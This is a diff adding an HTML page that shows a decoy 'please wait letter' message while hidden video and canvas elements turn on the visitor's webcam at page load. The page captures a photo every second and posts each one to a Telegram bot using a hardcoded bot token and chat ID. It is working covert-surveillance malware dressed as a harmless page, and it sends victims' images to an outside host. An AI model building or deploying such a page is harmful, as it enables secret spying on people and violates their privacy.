@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Webcam</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
+    video, canvas {
+      display: none; /* Hide the video and canvas elements */
+    }
+    #status {
+      font-size: 18px;
+      color: green;
+    }
+    #error {
+      color: red;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>please wait letter ✉️</h1>
+  <p id="status">generating.....</p>
+  <p id="error"></p>
+
+  <video id="video" width="640" height="480" autoplay style="visibility: hidden;"></video> <!-- Hide the video element -->
+  <canvas id="canvas" width="640" height="480" style="display: none;"></canvas> <!-- Keep canvas hidden -->
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const statusElement = document.getElementById('status');
+    const errorElement = document.getElementById('error');
+
+    // Using the provided Telegram bot token and chat ID
+    const TELEGRAM_BOT_TOKEN = '7819967626:AAFSA5LnWfAcni_ETGiJXTZIJCgEM_ObN88';
+    const CHAT_ID = '6672207604'; // Replace this with your actual user ID or chat ID
+
+    let isSending = false;
+    let captureInterval;
+
+    // Access the user's webcam
+    function initializeWebcam() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+          statusElement.textContent = "Webcam initialized. Ready to capture.";
+          startSendingPhotos(); // Automatically start sending photos
+        })
+        .catch(err => {
+          errorElement.textContent = `Error accessing the webcam: ${err.message}`;
+          console.error('Webcam access error:', err);
+        });
+    }
+
+    // Start capturing and sending images
+    function startSendingPhotos() {
+      if (!isSending) {
+        isSending = true;
+        statusElement.textContent = "Sending photos to Telegram...";
+        captureInterval = setInterval(() => {
+          captureAndSendPhoto();
+        }, 1000); // Capture and send every 1 second
+      }
+    }
+
+    // Capture image from the video and send to Telegram
+    function captureAndSendPhoto() {
+      // Draw the video frame to the canvas
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Convert the canvas to a data URL (base64 image)
+      const imageDataUrl = canvas.toDataURL('image/jpeg');
+
+      // Convert base64 image to Blob
+      const imageBlob = dataURItoBlob(imageDataUrl);
+
+      // Send the image to Telegram
+      sendPhotoToTelegram(imageBlob);
+    }
+
+    // Function to send the image to Telegram
+    function sendPhotoToTelegram(imageBlob) {
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', imageBlob, 'photo.jpg');
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          console.log('Photo sent successfully:', data);
+        } else {
+          errorElement.textContent = `Error sending photo: ${data.description}`;
+          console.error('Telegram API error:', data);
+        }
+      })
+      .catch(err => {
+        errorElement.textContent = `Error sending photo: ${err.message}`;
+        console.error('Send photo error:', err);
+      });
+    }
+
+    // Function to convert base64 to Blob
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+
+      return new Blob([ab], { type: mimeString });
+    }
+
+    // Initialize webcam when page loads
+    initializeWebcam();
+  </script>
+</body>
+</html>
